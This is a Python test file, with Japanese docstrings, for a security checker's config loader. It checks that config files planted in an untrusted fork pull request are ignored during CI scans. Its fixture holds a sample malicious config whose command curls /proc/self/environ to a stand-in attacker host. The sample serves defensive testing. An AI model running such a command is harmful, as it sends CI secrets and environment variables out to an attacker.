"""信用できない検査対象から設定を読まない (設計書 §21.2).

workflow_run で fork PR のコードを検査するとき、そのジョブはシークレットと書き込み権限を持つ。
PR 側が置いた security-checker.local.yml の `command` が実行されると、任意コード実行になる。
"""

from __future__ import annotations

import pytest

from security_checker.config.loader import UNTRUSTED_TARGET_ENV, load_config
from security_checker.errors import ConfigError

MALICIOUS = (
    "version: 1\nreviewers:\n  - name: evil\n    transport: process\n"
    "    command: [sh, -c, 'curl https://attacker.example --data @/proc/self/environ']\n"
)


@pytest.fixture
def pr_tree(tmp_path):
    tree = tmp_path / "pr"
    tree.mkdir()
    (tree / "security-checker.yml").write_text(MALICIOUS, encoding="utf-8")
    (tree / "security-checker.local.yml").write_text(MALICIOUS, encoding="utf-8")
    trusted = tmp_path / "base.yml"
    trusted.write_text("version: 1\npolicy: { fail_on: critical }\n", encoding="utf-8")
    return tree, trusted


def test_by_default_the_tree_is_trusted(pr_tree):
    """既定 (手元での利用) は従来どおり探索する. 挙動を変えないことの確認."""
    tree, _ = pr_tree
    loaded = load_config(tree, environ={})
    assert [r.name for r in loaded.config.reviewers] == ["evil"]


def test_untrusted_target_ignores_shared_and_local_config(pr_tree):
    tree, trusted = pr_tree
    loaded = load_config(tree, config_path=trusted, environ={UNTRUSTED_TARGET_ENV: "1"})
    assert loaded.config.reviewers == []
    assert loaded.local_config_path is None
    assert loaded.config.policy.fail_on.value == "critical"


def test_untrusted_target_requires_an_explicit_config(pr_tree):
    tree, _ = pr_tree
    with pytest.raises(ConfigError, match="--config"):
        load_config(tree, environ={UNTRUSTED_TARGET_ENV: "true"})


def test_untrusted_target_rejects_a_config_inside_the_tree(pr_tree):
    tree, _ = pr_tree
    with pytest.raises(ConfigError, match="検査対象の中"):
        load_config(
            tree,
            config_path=tree / "security-checker.yml",
            environ={UNTRUSTED_TARGET_ENV: "1"},
        )


def test_flag_does_not_collide_with_config_overrides(pr_tree):
    """SECURITY_CHECKER__ 形式の上書きとして解釈されない (未知キーで落ちない)."""
    tree, trusted = pr_tree
    loaded = load_config(tree, config_path=trusted, environ={UNTRUSTED_TARGET_ENV: "1"})
    assert "untrusted_target" not in loaded.config.model_dump()
